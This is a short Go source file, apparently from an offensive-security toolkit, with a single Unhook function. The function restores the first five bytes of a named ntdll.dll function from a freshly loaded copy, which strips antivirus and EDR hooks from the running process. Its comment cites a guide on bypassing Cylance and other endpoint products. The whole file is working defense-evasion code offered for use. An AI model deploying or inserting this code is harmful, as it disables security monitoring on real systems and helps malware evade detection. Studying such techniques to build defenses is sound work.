package core

/*

References:
https://github.com/RedLectroid/APIunhooker
https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis

*/

import (
  "fmt"
  "unsafe"
  "syscall"

  "golang.org/x/sys/windows"
)

func Unhook(funcname string) (error) {

  // Load DLL APIs
  k32 := syscall.NewLazyDLL("kernel32.dll")
  getCurrentProcess := k32.NewProc("GetCurrentProcess")
  getModuleHandle := k32.NewProc("GetModuleHandleW")
  getProcAddress := k32.NewProc("GetProcAddress")
  writeProcessMemory := k32.NewProc("WriteProcessMemory")

  var assembly_bytes []byte

  ntdll_lib, _ := syscall.LoadLibrary("C:\\Windows\\System32\\ntdll.dll")
  defer syscall.FreeLibrary(ntdll_lib)

  procAddr, _ := syscall.GetProcAddress(ntdll_lib, funcname)

  ptr_bytes := (*[1 << 30]byte)(unsafe.Pointer(procAddr))
  funcBytes := ptr_bytes[:5:5]

  for i := 0; i < 5; i++ {
    assembly_bytes = append(assembly_bytes, funcBytes[i])
  }

  ownHandle, _, _ := getCurrentProcess.Call()

  ntdll_ptr, _ := windows.UTF16PtrFromString("ntdll.dll")
  moduleHandle, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(ntdll_ptr)))

  func_ptr, _ := windows.UTF16PtrFromString(funcname)
  procAddr2, _, _ := getProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(func_ptr)))

  // Overwrite address with original function bytes
  writeProcessMemory.Call(ownHandle, procAddr2, uintptr(unsafe.Pointer(&assembly_bytes[0])), 5, uintptr(0))
  
  return nil
}


